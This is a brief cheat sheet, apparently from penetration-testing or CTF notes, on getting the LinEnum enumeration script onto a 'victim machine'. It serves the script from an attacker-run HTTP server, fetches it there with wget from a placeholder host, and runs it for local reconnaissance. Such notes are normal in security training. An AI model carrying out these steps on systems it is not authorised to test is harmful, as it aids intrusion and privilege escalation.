# Linux Enumeration

git clone https://github.com/rebootuser/LinEnum.git

### From the directory that LinEnum downloaded to start a simple HTTP server.
```
python -m SimpleHTTPServer 80
```

### On the victim machine.
```
wget http://<IP>:<PORT>/LinEnum.sh
```

### Make the shell executable.
```
chmod +x LinEnum.sh
```

### Run the script.
```
./LinEnum.sh
```
